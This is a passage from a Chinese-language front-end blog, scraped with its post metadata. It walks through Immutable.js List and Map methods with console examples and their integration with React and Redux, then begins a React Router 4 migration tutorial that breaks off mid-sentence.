从尾部获取几个复合条件的元素// 参数 数量console.log(Immutable.fromJS([1, &#123;a: 1&#125;, 3, 4, 5, 6]).takeLast(2).toJS()); // [5, 6]// takeWhile()// 从头开始循环，获取满足 return 条件===true 的元素。console.log(Immutable.fromJS([111, 33 , 22, 44, 55, 66]).takeWhile((value, index, array) =&gt; &#123; return value &gt; 31;&#125;).toJS()); //[111, 33]// takeUntil()// 从头开始循环，获取满足 return 条件===false 的元素。console.log(Immutable.fromJS([32, 33 , 40, 44, 55, 66]).takeUntil((value, index, array) =&gt; &#123; return value &gt; 41;&#125;).toJS()); //[32, 33 , 40]// Map// take(number)// 从头获取几个复合条件的元素// 参数 数量console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).take(2).toJS()); // &#123;a: 5, b: 2&#125;// takeLast(number)// 从尾部获取几个复合条件的元素// 参数 数量console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).takeLast(2).toJS()); // &#123;c: 3, d: 444&#125;// takeWhile()// 从头开始循环，获取满足 return 条件===true 的元素。console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).takeWhile((value, key, obj) =&gt; &#123; return value &gt; 2;&#125;).toJS()); //&#123;a: 5&#125;// takeUntil()// 从头开始循环，获取满足 return 条件===false 的元素。console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).takeUntil((value, key, obj) =&gt; &#123; return value &gt; 39;&#125;).toJS()); //&#123;a: 5, b: 2, c: 3&#125; 循环遍历1、map() filter() every() some() forEach() reduce() reduceRight() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// List//1. map()console.log(Immutable.fromJS([1, 2, 3, 4, 5]).map((value, index, array)=&gt;&#123; return value * 2;&#125;).toJS()); // [2, 4, 6, 8, 10]//2. filter()console.log(Immutable.fromJS([1, 2, 3, 4, 5]).filter((value, index, array)=&gt;&#123; return value % 2 === 0;&#125;).toJS()); // [2, 4]// filterNot() ...这个没有什么卵用//3. every()console.log(Immutable.fromJS([1, 2, 3, 4, 5]).every((value, index, array)=&gt;&#123; return value &gt; 2;&#125;)); // false//4. some()console.log(Immutable.fromJS([1, 2, 3, 4, 5]).some((value, index, array)=&gt;&#123; return value &gt; 2;&#125;)); // true//5. forEach() 返回迭代的条目数（包括返回false的最后一个迭代）// 与Array 的 forEach不同，如果sideEffect的任何调用返回false，迭代将停止。 返回迭代的条目数（包括返回false的最后一个迭代）。console.log(Immutable.fromJS([1, 2, 3, 4, 5, &#123;a: 123&#125;]).forEach((value, index, array)=&gt;&#123; console.log(value, index, array.toJS(), 'forEach'); return value &lt; 5;&#125;)); // 5//6. reduce()// 同原生用法//7. reduceRight()// 同原生用法// Map//1. map()console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).map((value, key, obj)=&gt;&#123; return value * 2;&#125;).toJS()); // &#123;a: 10, b: 4, c: 6, d: 888&#125;//2. filter()console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).filter((value, key, obj)=&gt;&#123; return value % 2 === 0;&#125;).toJS()); // &#123;b: 2, d: 444&#125;// filterNot() ...这个没有什么卵用//3. every()console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).every((value, key, obj)=&gt;&#123; return value &gt; 2;&#125;)); // false//4. some()console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).some((value, key, obj)=&gt;&#123; return value &gt; 2;&#125;)); // true//5. forEach() 返回迭代的条目数（包括返回false的最后一个迭代）// 与Array 的 forEach不同，如果sideEffect的任何调用返回false，迭代将停止。 返回迭代的条目数（包括返回false的最后一个迭代）。console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).forEach((value, key, obj)=&gt;&#123; return value &lt; 444;&#125;)); // 4//6. reduce()// 同原List用法//7. reduceRight()// 同List用法 Map 特有 mapKeys() mapEntries() 对Map元素进行处理，返回处理后的对象 12345678910//mapKeys() 返回对象console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).mapKeys((key)=&gt;&#123; return key + 'hhh';&#125;).toJS());// &#123;ahhh: 5, bhhh: 2, chhh: 3, dhhh: 444&#125;//mapEntries() 返回对象console.log(Immutable.fromJS(&#123;a: 5, b: 2, c: 3, d: 444&#125;).mapEntries(([key, value])=&gt;&#123; return [key + 'aaa', value+'hhhh'];&#125;).toJS());// &#123;aaaa: \"5hhhh\", baaa: \"2hhhh\", caaa: \"3hhhh\", daaa: \"444hhhh\"&#125; mergemerge() mergeDeep() mergeWith() mergeDeepWith() 12345678910111213141516171819202122232425262728293031323334353637383940414243// Listconst $test = Immutable.fromJS([1, 2, 3, 7, &#123;a: &#123;b: 55, c: 66&#125;&#125;]);const $test1 = Immutable.fromJS([1, 2, 3, 6, &#123;a: &#123;b: 333, d: 67&#125;&#125;]);// 浅mergeconsole.log($test.merge($test1).toJS(), $test.toJS());// $test1 -&gt; $test [1, 2, 3, 6, &#123;b: 333, d: 67&#125;] [1, 2, 3, 7, &#123;a: &#123;b: 55, c: 66&#125;&#125;]// 深mergeconsole.log($test.mergeDeep($test1).toJS(), $test.toJS());// $test1 -&gt; $test [1, 2, 3, 6, &#123;b: 333, c: 66, d: 67&#125;] [1, 2, 3, 7, &#123;a: &#123;b: 55, c: 66&#125;&#125;]// 浅merge自定义merge规则console.log($test.mergeWith((prev, next)=&gt; &#123; // 自定义转换 return prev;&#125;, $test1).toJS(), $test1.toJS());// 深merge自定义merge规则console.log($test.mergeDeepWith((prev, next)=&gt; &#123; // 自定义转换 return prev;&#125;, $test1).toJS(), $test1.toJS());// Mapconst $test = Immutable.fromJS(&#123;a: &#123;a1: 222, a3: 456&#125;, b: 2, c: 3, d: 444&#125;);const $test1 = Immutable.fromJS(&#123;a: &#123;a1: 222, a2: 234&#125;, b: 2, c: 3, d: 444&#125;);// 浅mergeconsole.log($test.merge($test1).toJS(), $test.toJS());// $test1 -&gt; $test &#123;a: &#123;a1: 222, a2: 234&#125;, b: 2, c: 3, d: 444&#125; &#123;a: &#123;a1: 222, a3: 456&#125;, b: 2, c: 3, d: 444&#125;// 深mergeconsole.log($test.mergeDeep($test1).toJS(), $test.toJS());// $test1 -&gt; $test &#123;a: &#123;a1: 222, a2: 234, a3: 456&#125;, b: 2, c: 3, d: 444&#125; &#123;a: &#123;a1: 222, a3: 456&#125;, b: 2, c: 3, d: 444&#125;// 浅merge自定义merge规则console.log($test.mergeWith((prev, next)=&gt; &#123; // 自定义转换 return prev;&#125;, $test1).toJS(), $test1.toJS());// 深merge自定义merge规则console.log($test.mergeDeepWith((prev, next)=&gt; &#123; // 自定义转换 return prev;&#125;, $test1).toJS(), $test1.toJS()); jonin() 转换为字符串 使用方式和原生Array的join()一样 1234// Listconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: 123, b: 321&#125;]).join()); // 1,2,3,Map &#123; \"a\": 123, \"b\": 321 &#125;// Mapconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: 444&#125;).join()); // 2,Map &#123; \"a1\": 222, \"a3\": 456 &#125;,3,444 isEmpty() 判空1234// 判断空Listconsole.log(Immutable.fromJS([]).isEmpty()); // true// 判断Map是否为空 比原生方便console.log(Immutable.fromJS(&#123;&#125;).isEmpty()); // true has() hasIn() 检查是否有某个key1234567// Listconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: 123, b: 321&#125;]).has('0')); // trueconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: 123, b: 321&#125;]).hasIn([3, 'b'])); // true// Mapconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: 444&#125;).has('a')); // trueconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: 444&#125;).hasIn(['a', 'a3'])); // true includes() 是否包含某些元素 includes()、contains()这俩等效 1234567891011// List// 对象是否包含某个元素，对Immutable元素使用Immutable.is 进行比较console.log(Immutable.fromJS([6, 5, 4, 3, 2, 1, 89]).includes('89'));// 数组没有字符89，所以返回 falseconsole.log(Immutable.fromJS([6, 5, 4, 3, 2, 1, '89']).contains('89'));// trueconsole.log(Immutable.fromJS([6, 5, 4, 3, 2, 1, Immutable.fromJS([6, 5, 4])]).contains(Immutable.fromJS([6, 5, 4])));// true// Map// 对象是否包含某个元素，对Immutable元素使用Immutable.is 进行比较console.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: 89&#125;).includes('89'));// 数组没有字符89，所以返回 falseconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: '89'&#125;).contains('89'));// trueconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: Immutable.fromJS([6, 5, 4])&#125;).contains(Immutable.fromJS([6, 5, 4])));// true isSubset() 子集判断1234567891011// List// isSubset()console.log(Immutable.fromJS([6, 5, 1, [6, 5, 4]]).isSubset(Immutable.fromJS([[6, 5, 4], 6, 5, 4, 3, 2, 1, '89'])));// true// isSuperset 就是 isSubset 参数掉个个儿console.log(Immutable.fromJS([[6, 5, 4], 6, 5, 4, 3, 2, 1, '89']).isSuperset(Immutable.fromJS([6, 5, 1, [6, 5, 4]])));// true// Map// isSubset()console.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;&#125;).isSubset(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: 5&#125;)));// true// isSuperset 就是 isSubset 参数掉个个儿console.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: 5&#125;).isSuperset(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;&#125;)));// true reverse() 反转123456// Listconsole.log(Immutable.fromJS([1, 2, 3, 4, 5, 6]).reverse().toJS());// [6, 5, 4, 3, 2, 1]// Mapconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: 222, a3: 456&#125;, c: 3, d: 5&#125;).reverse().toJS());// &#123;d: 5, c: 3, a: &#123;a1: 222, a3: 456&#125;, b: 2&#125; 排序 sort()和sortBy() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// List// sort(comparator?: (valueA: V, valueB: V) =&gt; number): Iterable&lt;K, V&gt;console.log(Immutable.fromJS([6, 5, 4, 3, 2, 1]).sort().toJS());// 传入比较函数console.log(Immutable.fromJS([1, 2, 3, 4, 5, 6]).sort((a, b) =&gt; &#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; if (a === b) &#123; return 0; &#125;&#125;).toJS());// sortBy/* sortBy&lt;C&gt;( comparatorValueMapper: (value: T, key: number, iter: Iterable&lt;number, T&gt;) =&gt; C, comparator?: (valueA: C, valueB: C) =&gt; number ): Iterable&lt;number, T&gt; */console.log(Immutable.fromJS([&#123;a: 1, b: &#123;c: 22&#125;&#125;, &#123;a: 2, b: &#123;c: 22&#125;&#125;, &#123;a: 1, b: &#123;c: 22&#125;&#125;, &#123;a: 3, b: &#123;c: 22&#125;&#125;, &#123;a: 10, b: &#123;c: 22&#125;&#125;, &#123;a: 9, b: &#123;c: 22&#125;&#125;]).sortBy((value, index, array)=&gt; &#123; return value.get('a')&#125;,(a, b) =&gt; &#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; if (a === b) &#123; return 0; &#125;&#125;).toJS());// Mapconsole.log(Immutable.fromJS(&#123;b: 2, a: 88, c: 3, d: 5&#125;).sort().toJS());// &#123;b: 2, c: 3, d: 5, a: 88&#125;// 传入比较函数console.log(Immutable.fromJS(&#123;b: 2, a: 88, c: 3, d: 5&#125;).sort((a, b) =&gt; &#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; if (a === b) &#123; return 0; &#125;&#125;).toJS());// &#123;b: 2, c: 3, d: 5, a: 88&#125;// sortBy/*sortBy&lt;C&gt;(comparatorValueMapper: (value: T, key: number, iter: Iterable&lt;number, T&gt;) =&gt; C,comparator?: (valueA: C, valueB: C) =&gt; number): Iterable&lt;number, T&gt;*/console.log(Immutable.fromJS(&#123;b: &#123;a: 2&#125;, a: &#123;a: 88&#125;, c: &#123;a: 3&#125;, d: &#123;a: 5&#125;&#125;).sortBy((value, key, obj)=&gt; &#123; return value.get('a')&#125;,(a, b) =&gt; &#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; if (a === b) &#123; return 0; &#125;&#125;).toJS());// &#123;b: &#123;a: 2&#125;, c: &#123;a: 3&#125;, d: &#123;a: 5&#125;, a: &#123;a: 88&#125;&#125; flatten() 平铺 参数默认情况下，false 深度平铺，true 浅度平铺1层 1234567891011// Listconsole.log(Immutable.fromJS([1, 2, 3, 4, [1, 11, 111, 12344], &#123;a: 1234, b: &#123;bb: [777, 888]&#125;&#125;, 5, 6]).flatten().toJS());// [1, 2, 3, 4, 1, 11, 111, 12344, 1234, 777, 888, 5, 6]console.log(Immutable.fromJS([1, 2, 3, 4, [1, 11, 111, 12344], &#123;a: 1234, b: &#123;bb: [777, 888]&#125;&#125;, 5, 6]).flatten(true).toJS());// [1, 2, 3, 4, 1, 11, 111, 12344, 1234, Object, 5, 6]// Mapconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: &#123;a5: 333&#125;, a3: [1,2,3]&#125;, c: 3, d: 5&#125;).flatten().toJS());// &#123;0: 1, 1: 2, 2: 3, b: 2, a5: 333, c: 3, d: 5&#125;console.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: &#123;a5: 333&#125;, a3: [1,2,3]&#125;, c: 3, d: 5&#125;).flatten(true).toJS());// &#123;b: 2, a1: Object, a3: Array[3], c: 3, d: 5&#125; groupBy() 分组 返回值是OrderedMap 1234567891011// Listconsole.log(Immutable.fromJS([&#123;v: 0, a: 111&#125;, &#123;v: 1, a: &#123;b: [1, 2, 3]&#125;&#125;, &#123;v: 1, a: 333&#125;, &#123;v: 0, a: &#123;b: [1, 2, 3]&#125;&#125;, &#123;v: 1, a: 333&#125;]).groupBy((value) =&gt; &#123; return value.get('a')&#125;).toJS());// OrderedMap &#123;111: Array[1], 333: Array[2], Map &#123; \"b\": List [ 1, 2, 3 ] &#125;: Array[2]&#125;// Mapconsole.log(Immutable.fromJS(&#123;b: &#123;a5: 333&#125;, a: &#123;a5: 333&#125;, c: &#123;a5: 334&#125;, d: &#123;a5: 334&#125;&#125;).groupBy((value) =&gt; &#123; return value.get('a5')&#125;).toJS());// OrderedMap &#123;333: &#123;b: &#123;a5: 333&#125;, a: &#123;a5: 333&#125;&#125;, 334: &#123;c: &#123;a5: 334&#125;, d: &#123;a5: 334&#125;&#125;&#125; flip() Map 特有翻转1console.log(Immutable.fromJS(&#123;b: 'b1', a: 'a1', c: 'c1', d: 'd1'&#125;).flip().toJS()); // &#123;b1: \"b\", a1: \"a\", c1: \"c\", d1: \"d\"&#125; 连接 concat()1234567891011// Listconst $test1 = Immutable.fromJS([1, 2, 3, 4, 5, 6]);const $test2 = Immutable.fromJS([111, 222, 333, 444, 555, 666]);console.log($test1.concat($test2).toJS()); //[1, 2, 3, 4, 5, 6, 111, 222, 333, 444, 555, 666]console.log($test1.toJS(), $test2.toJS()); //[1, 2, 3, 4, 5, 6] [111, 222, 333, 444, 555, 666]// Mapconst $test1 = Immutable.fromJS(&#123;b: 2, a: &#123;a1: &#123;a5: 333&#125;, a3: [1,2,3]&#125;, c: 3, d: 5&#125;);const $test2 = Immutable.fromJS(&#123;b1: 22, b: 34&#125;);console.log($test1.concat($test2).toJS()); //&#123;b: 34, a: Object, c: 3, d: 5, b1: 22&#125; 属性 b 被覆盖console.log($test1.toJS(), $test2.toJS()); //&#123;b: 2, a: &#123;a1: &#123;a5: 333&#125;, c: 3, d: 5&#125; b1: 22, b: 34&#125; 类型转换1、转换为原生类型 123456789101112131415161718192021// List// 浅层// toArrayconsole.log(Immutable.fromJS([1, 2, 3, 4, 5, 6, &#123;a: &#123;b: [1234, 22]&#125;&#125;]).toArray());// [1, 2, 3, 4, 5, 6, Map]console.log(Immutable.fromJS([1, 2, 3, 4, 5, 6, [1234, 22]]).toArray());// [1, 2, 3, 4, 5, 6, List]// toObjectconsole.log(Immutable.fromJS([1, 2, 3, 4, 5, 6, &#123;a: &#123;b: [1234, 22]&#125;&#125;]).toObject());// &#123;0: 1, 1: 2, 2: 3, 3: 4, 4: 5, 5: 6, 6: Map&#125;console.log(Immutable.fromJS([1, 2, 3, 4, 5, 6, [1234, 22]]).toObject());// &#123;0: 1, 1: 2, 2: 3, 3: 4, 4: 5, 5: 6, 6: List&#125;//深层// 就是一直在用的 toJS(); 不到万不得已，尽量不用。// Map// 浅层// toArrayconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: &#123;a5: 333&#125;, a3: [1,2,3]&#125;, c: 3, d: 5&#125;).toArray());// [2, Map, 3, 5]console.log(Immutable.fromJS(&#123;b: 2, a: [1, 2, 2], c: 3, d: 5&#125;).toArray());// [2, List, 3, 5]// toObjectconsole.log(Immutable.fromJS(&#123;b: 2, a: &#123;a1: &#123;a5: 333&#125;, a3: [1,2,3]&#125;, c: 3, d: 5&#125;).toObject());// &#123;b: 2, a: Map, c: 3, d: 5&#125;console.log(Immutable.fromJS(&#123;b: 2, a: [1, 2, 2]&#125;).toObject());// &#123;b: 2, a: List&#125;//深层// 就是一直在用的 toJS(); 不到万不得已，尽量不用。 2、转换为其他ImmutableJS数据类型 123456// toMap()// toOrderedMap()// toSet()// toOrderedSet()// toList()// toStack() 七、和React Redux 架构的结合 利用 immutable.js 不可变的特性，可以极大的优化React render的冗余执行。React 官方提供的PureRenderMixin是浅比较 1、immutable-pure-render-decorator 专门针对immutable的PureRenderMixin，用来装饰React组件 12345678910111213141516171819202122232425import &#123;React&#125; from 'base';import pureRenderDecorator from '../../../widgets/libs/immutable-pure-render-decorator';@pureRenderDecoratorexport default class PartA extends React.Component &#123; constructor(props) &#123; super(props); // 舍弃React.addons.PureRenderMixin // this.shouldComponentUpdate = React.addons.PureRenderMixin.shouldComponentUpdate.bind(this); &#125; render() &#123; console.log('组件PartA，render执行了'); const data = this.props.data; return ( &lt;section&gt; &lt;div&gt; &lt;p&gt;我是组件PartA&lt;/p&gt; &lt;p&gt;&#123;data.toJSON ? JSON.stringify(data.toJSON()) : data&#125;&lt;/p&gt; &lt;/div&gt; &lt;/section&gt; ) &#125;&#125; 2、优化shouldComponentUpdate() 我们都知道官方提供的React.addons.PureRenderMixin提供的shouldComponentUpdate()，只能进行浅比较，对于引用类型Object、Array比较无力，而如果使用Immutable的Map和List替换Object、Array，则可以使用Immutable.is()来比较两个引用类型，从而补充了React.addons.PureRenderMixin的漏洞。 3、高阶组件封装 对于使用immutable.js的项目，在应用公共组件的时候，由于公共组件的内部实现一定是原生JS数据，所以我们只能传递原生JS数据到公共组件，但是如果转换成了原生JS数据，就又会出现&quot;React.addons.PureRenderMixin提供的shouldComponentUpdate()`是浅比较”问题，对此可以使用下面的高阶组件进行封装 12345678910111213141516import &#123;React&#125; from 'base';// 通过Immutable.is 封装过的 shouldComponentUpdateimport &#123;shouldComponentUpdate&#125; from '../immutable-pure-render-decorator';export default ComposedComponent =&gt; &#123; return class extends React.Component &#123; constructor(props) &#123; super(props); this.shouldComponentUpdate = shouldComponentUpdate.bind(this); &#125; render() &#123; const props = this.props.toJS ? this.props.toJS() : this.props; return &lt;ComposedComponent &#123;...this.props&#125; &#123;...props&#125; /&gt;; &#125; &#125;&#125;; 3、Demo 12345678910111213141516171819202122232425262728import &#123;React&#125; from 'base';import &#123; connect &#125; from 'react-redux';import highComponent from '../../../../widgets/libs/utils/highComponent';import actions from '../../actions';// 公共组件import Dialog from '@alife/dialog';// import Immutable from 'immutable';function mapStateToProps(state) &#123; return &#123; open: state.getIn(['dialog', 'open']), title: state.getIn(['dialog', 'title']) &#125;&#125;function mapDispatchToProps(dispatch) &#123; return &#123; onPrimaryTouchTap: ()=&gt; &#123; dispatch(actions.toggleDialog(false)); &#125;, onSecondaryTouchTap: ()=&gt; &#123; dispatch(actions.toggleDialog(false)); &#125; &#125;&#125;export default connect(mapStateToProps, mapDispatchToProps)(highComponent(Dialog))//通过高阶组件封装 八、思维导图总结API https://www.processon.com/view/link/5a12c0ede4b0d53d979b33da 九、更多参考 facebook.github.io/immutable-js/docs/","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"},{"name":"Immutable","slug":"Immutable","permalink":"https://ru23.com/tags/Immutable/"}]},{"title":"React之React Router 4（十一）","slug":"2017-11-react-study-router-4-xx","date":"2017-11-19T16:06:10.000Z","updated":"2018-10-24T03:46:02.270Z","comments":true,"path":"note/c26fe21f.html","link":"","permalink":"https://ru23.com/note/c26fe21f.html","excerpt":"","text":"一、React-router V4版本修改内容及一些坑1、所有组件更改为从react-router-dom导入 12345678//v2import &#123;Router,Route,hashHistory&#125; from 'react-router';// 4.xx写法//v4import &#123;Route,BrowserRouter as Router, Switch&#125; from 'react-router-dom';// 如果搭配redux，你还需要使用react-router-redux 2、将所有替换为 123456//v2 &lt;Router history=&#123;hashHistory&#125;&gt; &lt;Route path=\"/\" component=&#123;PCIndex&#125;&gt;&lt;/Route&gt; &lt;Route path=\"/details/:uniqueky\" component=&#123;PCNewsDetails&#125;&gt;&lt;/Route&gt; &lt;Route path=\"/usercenter\" component=&#123;PCUserCenter&#125;&gt;&lt;/Route&gt; &lt;/Router&gt; 现在需要更改为BrowserRouter 这里的代码不仅仅是将Router替换为BrowserRouter,而且还把所有的Route中用Switch包裹起来. 12345678//v4&lt;BrowserRouter&gt; &lt;Switch&gt; &lt;Route exact path=\"/\" component=&#123;MobileIndex&#125;&gt;&lt;/Route&gt; &lt;Route path=\"/details/:uniqueky\" component=&#123;MobileNewsDetails&#125;&gt;&lt;/Route&gt; &lt;Route path=\"/usercenter\" component=&#123;MobileUserCenter&#125;&gt;&lt;/Route&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; 3、只能有一个子节点 &lt;BroserRouter&gt;只能有一个子节点,所以官网建议的是使用&lt;Switch&gt;进行包裹 123456// v3&lt;Route path='/' component=&#123;App&#125;&gt; &lt;IndexRoute component=&#123;Home&#125; /&gt; &lt;Route path='about' component=&#123;About&#125; /&gt; &lt;Route path='contact' component=&#123;Contact&#125; /&gt;&lt;/Route&gt; 12345678// v4const App = () =&gt; ( &lt;Switch&gt; &lt;Route exact path='/' component=&#123;Home&#125; /&gt; &lt;Route path='/about' component=&#123;About&#125; /&gt; &lt;Route path='/contact' component=&#123;Contact&#125; /&gt; &lt;/Switch&gt;) 4、最坑的地方:在当前目录下的文件路径不再使用./, 而是直接用/. 在进行文件引用的时候 ,./src/js的写法需要更改文’/src/js‘, 这是更改之后最坑的地方 二、安装 react-router-dom暴露出react-router中暴露的对象与方法，因此你只需要安装并引用react-router-dom即可 1npm install --save react-router-dom 三、路由器(Router) 在你开始项目前，你需要决定你使用的路由器的类型。对于网页项目，存在&lt;BrowserRouter&gt;与&lt;HashRouter&gt;两种组件。当存在服务器来管理动态请求时，需要使用&lt;BrowserRouter&gt;组件，而&lt;HashRouter&gt;被用于静态网站。通常，我们更倾向选择&lt;BrowserRouter&gt;，但如果你的网站仅用来呈现静态文件，那么&lt;HashRouter&gt;将会是一个好选择 四、历史(History) 每个路由器都会创建一个history对象并用其保持追踪当前location[注1]并且在有变化时对网站进行重新渲染。这个history对象保证了React Router提供的其他组件的可用性，所以其他组件必须在router内部渲染。一个React Router组件如果向父级上追溯却找不到router组件，那么这个组件将无法正常工作 五、渲染 路由器组件无法接受两个及以上的子元素。基于这种限制的存在，创建一个&lt;App&gt;组件来渲染应用其余部分是一个有效的方法 123456import &#123; BrowserRouter &#125; from 'react-router-dom'ReactDOM.render(( &lt;BrowserRouter&gt; &lt;App /&gt; &lt;/BrowserRouter&gt;), document.getElementById('root')) 六、&lt;App&gt; 应用通过&lt;App&gt;组件定义。简化一下，我们将应用拆分成两个部分。&lt;Header&gt;组件包含网站的导航链接。&lt;Main&gt;组件则呈现其余内容 123456const App = () =&gt; ( &lt;div&gt; &lt;Header /&gt; &lt;Main /&gt; &lt;/div&gt;) 七、路由(Route) &lt;Route&gt;组件是React Router中主要的结构单元。在任意位置只要匹配了URL的路径名(pathname)你就可以创建&lt;Route&gt;元素进行渲染 1、路径(Path) &lt;Route&gt;接受一个数为string类型的path，该值路由匹配的路径名的类型。例如：&lt;Route path=&#39;/roster&#39;/&gt;会匹配以/roster开头的路径名。在当前path参数与当前location的路径相匹配时，路由就会开始渲染React元素。若不匹配，路由不会进行任何操作 123456&lt;Route path='/roster'/&gt;// 当路径名为'/'时, path不匹配// 当路径名为'/roster'或'/roster/2'时, path匹配// 当你只想匹配'/roster'时，你需要使用\"exact\"参数// 则路由仅匹配'/roster'而不会匹配'/roster/2'&lt;Route exact path='/roster'/&gt; 注意：在匹配路由时，React Router只关注location的路径名。当URL如下时 1http://www.example.com/my-projects/one?extra=false React Router去匹配的只是&#39;/my-projects/one&#39;这一部分 2、匹配路径 path-to-regexp包用来决定route元素的path参数与当前location是否匹配。它将路径字符串编译成正则表达式，并与当前location的路径名进行匹配比较 当路由地址匹配成功后，会创建一个含有以下属性的match对象： url ：与当前location路径名所匹配部分 path：路由的地址 isExact ：path 是否等于 pathname params：从path-to-regexp获取的路径中取出的值都被包含在这个对象中 使用route tester这款工具来对路由与URL进行检验 3、创建你的路由 可以在路由器(router)组件中的任意位置创建多个&lt;Route&gt;，但通常我们会把它们放在同一个位置。使用&lt;Switch&gt;组件来包裹一组&lt;Route&gt;。&lt;Switch&gt;会遍历自身的子元素（即路由）并对第一个匹配当前路径的元素进行渲染 我们希望匹配一下路径 /：主页 /roster： 团体列表 /roster/:number：运动员页面，使用运动员的编号作为标识 /schedule：团队的赛程表 为了在应用中能匹配路径，在创建&lt;Route&gt;元素时必须带有需要匹配的path作为参数 123456&lt;Switch&gt; &lt;Route exact path='/' component=&#123;Home&#125;/&gt; &#123;/* both /roster and /roster/:number begin with /roster */&#125; &lt;Route path='/roster' component=&#123;Roster&#125;/&gt; &lt;Route path='/schedule' component=&#123;Schedule&#125;/&gt;&lt;/Switch&gt; 4、&lt;Route&gt;是如何渲染的？ 当一个路由的path匹配成功后，路由用来确定渲染结果的参数有三种。只需要提供其中一个即可 component ： 一个React组件。当带有component参数的route匹配成功后，route会返回一个新的元素，其为component参数所对应的React组件（使用React.createElement创建）。 render ： 一个返回React element的函数。当匹配成功后调用该函数。该过程与传入component参数类似，并且对于行级渲染与需要向元素传入额外参数的操作会更有用。 children ： 一个返回React element的函数。与上述两个参数不同，无论route是否匹配当前location，其都会被渲染 12345678910&lt;Route path='/page' component=&#123;Page&#125; /&gt;const extraProps = &#123; color: 'red' &#125;&lt;Route path='/page' render=&#123;(props) =&gt; ( &lt;Page &#123;...props&#125; data=&#123;extraProps&#125;/&gt;)&#125;/&gt;&lt;Route path='/page' children=&#123;(props) =&gt; ( props.match ? &lt;Page &#123;...props&#125;/&gt; : &lt;EmptyPage &#123;...props&#125;/&gt;)&#125;/&gt; 通常component参数与render参数被更经常地使用。children参数偶尔会被使用，它更常用在path无法匹配时呈现的’空’状态。在本例中并不会有额外的状态，所以我们将使用&lt;Route&gt;的component参数 通过&lt;Route&gt;渲染的元素会被传入一些参数。分别是match对象，当前location对象以及history对象（由router创建） 5、&lt;Main&gt; 现在我们清楚了根路由的结构，我们需要实际渲染我们的路由。对于这个应用，我们将会在&lt;Main&gt;组件中渲染&lt;Switch&gt;与&lt;Route&gt;，这一过程会将route匹配生成的HTML放在&lt;main&gt;节点中 12345678910import &#123; Switch, Route &#125; from 'react-router-dom'const Main = () =&gt; ( &lt;main&gt; &lt;Switch&gt; &lt;Route exact path='/' component=&#123;Home&#125;/&gt; &lt;Route path='/roster' component=&#123;Roster&#125;/&gt; &lt;Route path='/schedule' component=&#123;Schedule&#125;/&gt; &lt;/Switch&gt; &lt;/main&gt;) 注意：主页路由包含额外参数。该参数用来保证路由能准确匹配path 6、嵌套路由 123456789101112131415161718192021222324252627282930313233// v3import React from \"react\";import &#123; render &#125; from \"react-dom\";import &#123; Router, Route, IndexRoute, Link, browserHistory &#125; from \"react-router\";const PrimaryLayout = props =&gt; &lt;div className=\"primary-layout\"&gt; &lt;header&gt;Our React Router 3 App&lt;/header&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to=\"/\"&gt;Home&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"/user\"&gt;User&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; &lt;main&gt; &#123;props.children&#125; &lt;/main&gt; &lt;/div&gt;;const HomePage = () =&gt; &lt;h1&gt;Home Page&lt;/h1&gt;;const UsersPage = () =&gt; &lt;h1&gt;User Page&lt;/h1&gt;;const App = () =&gt; &lt;Router history=&#123;browserHistory&#125;&gt; &lt;Route path=\"/\" component=&#123;PrimaryLayout&#125;&gt; &lt;IndexRoute component=&#123;HomePage&#125; /&gt; &lt;Route path=\"/user\" component=&#123;UsersPage&#125; /&gt; &lt;/Route&gt; &lt;/Router&gt;;render(&lt;App /&gt;, document.getElementById(\"root\")); 上面代码中有几个关键的点在 V4 中就不复存在了 集中式 router 通过 &lt;Route&gt; 嵌套，实现Layout 和 page 嵌套 Layout 和 